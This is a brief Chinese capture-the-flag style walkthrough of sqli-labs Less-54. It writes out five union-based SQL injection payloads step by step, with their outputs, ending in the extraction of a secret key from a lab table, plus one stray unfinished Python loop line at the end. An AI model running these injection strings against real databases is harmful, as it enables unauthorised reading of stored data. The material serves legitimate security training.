Less-54

本关开始，又有了新类型的题目了

题目要求注出secret key，并且提交的次数有十次的限制，本关就先一次一次记录一下：

①发现单引号包裹

?id=2' or 1=1 --+

回显：Your Login name:Dumb；Your Password:Dumb

②union联合查询成功

?id=-1' union select 1,2,3 --+

回显：Your Login name:2;Your Password:3

③查询表名成功

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

回显：Your Login name:2;Your Password:c4ukmmeokq

④查询列名成功

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="c4ukmmeokq" --+

回显：Your Login name:2;Your Password:id,sessid,secret_SAT4,tryy

⑤获取密钥

?id=-1' union select 1,2,secret_SAT4 from c4ukmmeokq --+

回显：Your Login name:2;Your Password:BlKuhIw2XDbdZWwN6f2W1cTm

    for j in range(95,125):
